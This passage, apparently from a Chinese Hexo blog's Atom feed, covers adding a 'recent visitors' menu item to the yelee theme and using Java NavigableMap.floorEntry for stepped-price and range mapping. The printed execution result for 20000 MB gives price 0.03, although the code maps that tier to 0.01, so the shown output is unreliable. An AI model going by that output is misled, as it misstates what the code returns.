id="4-添加详情页菜单项图标"><a href="#4-添加详情页菜单项图标" class="headerlink" title="4. 添加详情页菜单项图标"></a>4. 添加详情页菜单项图标</h3><p>直接copy aboutme的图标内容。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;%if(theme.visitor)&#123;%&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;icon-wrap icon-me hide&quot;</span> <span class="attr">data-idx</span>=<span class="string">&quot;4&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;user&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;shoulder&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">&lt;%&#125;%&gt;</span><br></pre></td></tr></table></figure><h3 id="5-效果图-1"><a href="#5-效果图-1" class="headerlink" title="5. 效果图"></a>5. 效果图</h3><p>![最近访客详情页]<a href="http://o7kubqw1j.bkt.clouddn.com//images/article/yelee%E4%B8%BB%E9%A2%98%E6%9C%80%E8%BF%91%E8%AE%BF%E5%AE%A2/2016-08-20">http://o7kubqw1j.bkt.clouddn.com//images/article/yelee主题最近访客/2016-08-20</a> 14-27-49.jpg)<br>![最近访客详情页]<a href="http://o7kubqw1j.bkt.clouddn.com//images/article/yelee%E4%B8%BB%E9%A2%98%E6%9C%80%E8%BF%91%E8%AE%BF%E5%AE%A2/2016-08-20">http://o7kubqw1j.bkt.clouddn.com//images/article/yelee主题最近访客/2016-08-20</a> 14-27-49.jpg)</p>]]></content>
    
    
    <summary type="html">&lt;img src=&quot;/asserts/images/logo/blog9.png&quot; title=&quot;blog&quot; class=&quot;img-logo img-center&quot; /&gt;

&lt;h2 id=&quot;一、前言&quot;&gt;&lt;a href=&quot;#一、前言&quot; class=&quot;headerlink&quot; title=&quot;一、前言&quot;&gt;&lt;/a&gt;一、前言&lt;/h2&gt;&lt;p&gt;最近将博客hexo主题由原来的jacman换成高大上的yelee。&lt;br&gt;原来在jacman主题自定义了一些挂件，例如:多说的最近访客。&lt;br&gt;希望将原来的 &lt;strong&gt;最近访客&lt;/strong&gt; 挂件迁移到yelee主题。&lt;/p&gt;
&lt;h2 id=&quot;二、菜单项&quot;&gt;&lt;a href=&quot;#二、菜单项&quot; class=&quot;headerlink&quot; title=&quot;二、菜单项&quot;&gt;&lt;/a&gt;二、菜单项&lt;/h2&gt;&lt;h3 id=&quot;1-查找菜单项文件&quot;&gt;&lt;a href=&quot;#1-查找菜单项文件&quot; class=&quot;headerlink&quot; title=&quot;1. 查找菜单项文件&quot;&gt;&lt;/a&gt;1. 查找菜单项文件&lt;/h3&gt;&lt;p&gt;通过chrome开发者工具，查看菜单 &lt;strong&gt;关于我&lt;/strong&gt; 菜单项内容元素。&lt;/p&gt;
&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;section&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&amp;quot;switch-part switch-part4&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;div&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;id&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&amp;quot;js-aboutme&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;只求成为一名靠谱的码农&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;div&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;section&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;然后，根据元素标签特征(这里选 &lt;strong&gt;switch-part4&lt;/strong&gt; )，在yelee主题目录搜索layout目录下包含 &lt;strong&gt;switch-part4&lt;/strong&gt; 的文件内容。&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;yerba-buena:yelee yeshaoting$ grep -ir &lt;span class=&quot;string&quot;&gt;&amp;quot;switch-part4&amp;quot;&lt;/span&gt; layout/&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;layout//_partial/left-col.ejs:                &amp;lt;section class=&lt;span class=&quot;string&quot;&gt;&amp;quot;switch-part switch-part4&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;可以看到，该文件内容存在于 layout//_partial/left-col.ejs 目录。&lt;/p&gt;
&lt;h3 id=&quot;2-添加菜单项&quot;&gt;&lt;a href=&quot;#2-添加菜单项&quot; class=&quot;headerlink&quot; title=&quot;2. 添加菜单项&quot;&gt;&lt;/a&gt;2. 添加菜单项&lt;/h3&gt;&lt;p&gt;在left-col.ejs文件里，找到tips-box元素块，并类似aboutme添加visitor，如下:&lt;/p&gt;
&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;div&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&amp;quot;tips-box hide&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;div&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&amp;quot;tips-arrow&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;div&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;ul&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&amp;quot;tips-inner&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;li&lt;/span&gt;&amp;gt;&lt;/span&gt;&amp;lt;%= __(&amp;#x27;index.menu&amp;#x27;) %&amp;gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;li&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;li&lt;/span&gt;&amp;gt;&lt;/span&gt;&amp;lt;%= __(&amp;#x27;index.tags&amp;#x27;) %&amp;gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;li&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;lt;%if(theme.friends &amp;amp;&amp;amp; theme.friends.length != 0)&amp;#123;%&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;li&lt;/span&gt;&amp;gt;&lt;/span&gt;&amp;lt;%= __(&amp;#x27;index.friends&amp;#x27;) %&amp;gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;li&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;lt;%&amp;#125;%&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;lt;%if(theme.aboutme)&amp;#123;%&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;li&lt;/span&gt;&amp;gt;&lt;/span&gt;&amp;lt;%= __(&amp;#x27;index.about&amp;#x27;) %&amp;gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;li&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;lt;%&amp;#125;%&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;lt;%if(theme.visitor)&amp;#123;%&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;li&lt;/span&gt;&amp;gt;&lt;/span&gt;&amp;lt;%= __(&amp;#x27;index.visitor&amp;#x27;) %&amp;gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;li&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;lt;%&amp;#125;%&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;ul&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;div&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&quot;3-菜单项名称&quot;&gt;&lt;a href=&quot;#3-菜单项名称&quot; class=&quot;headerlink&quot; title=&quot;3. 菜单项名称&quot;&gt;&lt;/a&gt;3. 菜单项名称&lt;/h3&gt;&lt;p&gt;由于主题支持多语言，因此通过 &lt;code&gt;__(&amp;#39;index.visitor&amp;#39;)&lt;/code&gt; 这些的方法从语言包里获取对应的内容。&lt;br&gt;该语言文件在主题的languages目录。我的设置为:&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;# zh-Hans: Chinese (Simplified) 大陆简体&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;index:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  menu: 菜单&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  tags: 标签&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  friends: 友情链接&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  about: 个人签名&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  visitor: 最近访客&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  more: 阅读全文&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  copy: 复制&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&quot;4-开启菜单项&quot;&gt;&lt;a href=&quot;#4-开启菜单项&quot; class=&quot;headerlink&quot; title=&quot;4. 开启菜单项&quot;&gt;&lt;/a&gt;4. 开启菜单项&lt;/h3&gt;&lt;p&gt;注意到主题配置文件里，通过aboutme来开关“关于我”菜单项。&lt;br&gt;同样，我们也在配置文件里添加一项来控制“最近访客”菜单项是否展示。如下:&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#是否开启“最近访客”功能。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;visitor: &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&quot;5-效果图&quot;&gt;&lt;a href=&quot;#5-效果图&quot; class=&quot;headerlink&quot; title=&quot;5. 效果图&quot;&gt;&lt;/a&gt;5. 效果图&lt;/h3&gt;&lt;p&gt;![最近访客菜单项]&lt;a href=&quot;http://o7kubqw1j.bkt.clouddn.com//images/article/yelee%E4%B8%BB%E9%A2%98%E6%9C%80%E8%BF%91%E8%AE%BF%E5%AE%A2/2016-08-20&quot;&gt;http://o7kubqw1j.bkt.clouddn.com//images/article/yelee主题最近访客/2016-08-20&lt;/a&gt; 13-41-17.jpg)&lt;br&gt;![最近访客菜单项]&lt;a href=&quot;http://o7kubqw1j.bkt.clouddn.com//images/article/yelee%E4%B8%BB%E9%A2%98%E6%9C%80%E8%BF%91%E8%AE%BF%E5%AE%A2/2016-08-20&quot;&gt;http://o7kubqw1j.bkt.clouddn.com//images/article/yelee主题最近访客/2016-08-20&lt;/a&gt; 13-41-17.jpg)&lt;/p&gt;</summary>
    
    
    
    <category term="博客搭建" scheme="http://yeshaoting.cn/categories/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    
    
    <category term="hexo" scheme="http://yeshaoting.cn/tags/hexo/"/>
    
  </entry>
  
  <entry>
    <title>java范围映射</title>
    <link href="http://yeshaoting.cn/article/java/java%E8%8C%83%E5%9B%B4%E6%98%A0%E5%B0%84/"/>
    <id>http://yeshaoting.cn/article/java/java%E8%8C%83%E5%9B%B4%E6%98%A0%E5%B0%84/</id>
    <published>2016-08-11T07:13:00.000Z</published>
    <updated>2021-07-01T04:25:31.000Z</updated>
    
    <content type="html"><![CDATA[<img src="/asserts/images/logo/javaee.png" class="img-logo img-center" /><h2 id="一、背景"><a href="#一、背景" class="headerlink" title="一、背景"></a>一、背景</h2><p>近期一个功能开发涉及到一个核心业务规则为：根据消费额实行阶梯计价，额度处于的阶梯档位不同，对应的单价不同，需要根据给定的消费额找到对应的消费单价。</p><h2 id="二、问题分析"><a href="#二、问题分析" class="headerlink" title="二、问题分析"></a>二、问题分析</h2><p>阶梯计价翻译成编码逻辑，先容易想到是一个映射，即：Map。<br>不过特殊的地方在于，这是一个范围映射，将一个范围的键值映射到一个固定的值。<br>下来我们来看一下这种范围映射逻辑如何使用java程序来表现。</p><h2 id="三、范围映射分类"><a href="#三、范围映射分类" class="headerlink" title="三、范围映射分类"></a>三、范围映射分类</h2><p>范围映射按其连续性，可以简单分为如下两类情形：</p><h3 id="1-连续的范围映射"><a href="#1-连续的范围映射" class="headerlink" title="1. 连续的范围映射"></a>1. 连续的范围映射</h3><p>例如：计价阶梯就是连续的范围映射。<br>大多数情况下，计价阶梯都是连续的情况。</p><h4 id="场景举例"><a href="#场景举例" class="headerlink" title="场景举例"></a>场景举例</h4><p>举个大家都熟悉的场景：北京移动套餐外流量资费。这一流量资费在某个时期就是阶梯计价的，消费阶梯是连续的。<br>具体的阶梯计价映射关系如下：</p><table><thead><tr><th>流量消费阶梯</th><th>流量单价</th></tr></thead><tbody><tr><td>[0,100MB)</td><td>0.15元/MB</td></tr><tr><td>[100MB,500MB)</td><td>0.08元/MB</td></tr><tr><td>[500MB,1GB)</td><td>0.05元/MB</td></tr><tr><td>[1GB,2GB)</td><td>0.04元/MB</td></tr><tr><td>[2GB,15GB)</td><td>0.03元/MB</td></tr><tr><td>[15GB,∞)</td><td>0.01元/MB</td></tr></tbody></table><span id="more"></span><h4 id="实现代码"><a href="#实现代码" class="headerlink" title="实现代码"></a>实现代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.yeshaoting.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Map.Entry;</span><br><span class="line"><span class="keyword">import</span> java.util.NavigableMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.junit.Before;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.google.common.collect.Lists;</span><br><span class="line"><span class="keyword">import</span> com.google.common.collect.Maps;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span> 阶梯计价</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yeshaoting</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> Aug 8, 2016 12:26:39 PM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SteppedCalculateTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 流量下界阶梯</span></span><br><span class="line">    <span class="keyword">private</span> NavigableMap&lt;Integer, Double&gt; steppedFloorFlows = Maps.newTreeMap();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">int</span> GB = <span class="number">1000</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Before</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        steppedFloorFlows.put(<span class="number">0</span>, <span class="number">0.15</span>);</span><br><span class="line">        steppedFloorFlows.put(<span class="number">100</span>, <span class="number">0.08</span>);</span><br><span class="line">        steppedFloorFlows.put(<span class="number">500</span>, <span class="number">0.05</span>);</span><br><span class="line">        steppedFloorFlows.put(GB * <span class="number">1</span>, <span class="number">0.04</span>);</span><br><span class="line">        steppedFloorFlows.put(GB * <span class="number">2</span>, <span class="number">0.03</span>);</span><br><span class="line">        steppedFloorFlows.put(GB * <span class="number">15</span>, <span class="number">0.01</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">continuousStepTest</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        List&lt;Integer&gt; flows = Lists.newArrayList(<span class="number">70</span>, <span class="number">100</span>, <span class="number">200</span>, <span class="number">500</span>, GB * <span class="number">20</span>);</span><br><span class="line">        calculate(flows);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">calculate</span><span class="params">(List&lt;Integer&gt; flows)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (Integer flow : flows) &#123;</span><br><span class="line">            Entry&lt;Integer, Double&gt; entry = steppedFloorFlows.floorEntry(flow);</span><br><span class="line">            System.out.println(<span class="string">&quot;消费额:&quot;</span> + flow + <span class="string">&quot;MB\t -&gt; 档位:&quot;</span> + entry.getKey() + <span class="string">&quot;\t单价:&quot;</span> + entry.getValue());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="执行结果"><a href="#执行结果" class="headerlink" title="执行结果"></a>执行结果</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">消费额:70 -&gt; 档位:0单价:0.15</span><br><span class="line">消费额:100 -&gt; 档位:100单价:0.08</span><br><span class="line">消费额:200 -&gt; 档位:100单价:0.08</span><br><span class="line">消费额:500 -&gt; 档位:500单价:0.05</span><br><span class="line">消费额:20000 -&gt; 档位:15000单价:0.03</span><br></pre></td></tr></table></figure><h3 id="2-不连续的范围映射"><a href="#2-不连续的范围映射" class="headerlink" title="2. 不连续的范围映射"></a>2. 不连续的范围映射</h3><p>某些特殊的业务场景需要实现不连续的范围映射。</p><h4 id="范围映射"><a href="#范围映射" class="headerlink" title="范围映射"></a>范围映射</h4><table><thead><tr><th>范围</th><th>值</th></tr></thead><tbody><tr><td>[0,3)</td><td>0</td></tr><tr><td>[5,10)</td><td>1</td></tr><tr><td>[100,200)</td><td>2</td></tr></tbody></table><h4 id="实现代码-1"><a href="#实现代码-1" class="headerlink" title="实现代码"></a>实现代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.yeshaoting.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Map.Entry;</span><br><span class="line"><span class="keyword">import</span> java.util.NavigableMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.lang3.tuple.Pair;</span><br><span class="line"><span class="keyword">import</span> org.junit.Before;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.google.common.collect.Lists;</span><br><span class="line"><span class="keyword">import</span> com.google.common.collect.Maps;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span> 范围映射</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yeshaoting</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> Aug 8, 2016 12:26:39 PM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RangeCalculateTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 范围映射</span></span><br><span class="line">    <span class="keyword">private</span> NavigableMap&lt;Integer, Pair&lt;Integer, Integer&gt;&gt; ranges = Maps.newTreeMap();</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Before</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        ranges.put(<span class="number">0</span>, Pair.of(<span class="number">3</span>, <span class="number">0</span>));       <span class="comment">// 0..3     =&gt; 0</span></span><br><span class="line">        ranges.put(<span class="number">5</span>, Pair.of(<span class="number">10</span>, <span class="number">1</span>));      <span class="comment">// 5..10    =&gt; 1</span></span><br><span class="line">        ranges.put(<span class="number">100</span>, Pair.of(<span class="number">200</span>, <span class="number">2</span>));   <span class="comment">// 100..200 =&gt; 2</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">uncontinuousStepTest</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        List&lt;Integer&gt; values = Lists.newArrayList(<span class="number">2</span>, <span class="number">3</span>, <span 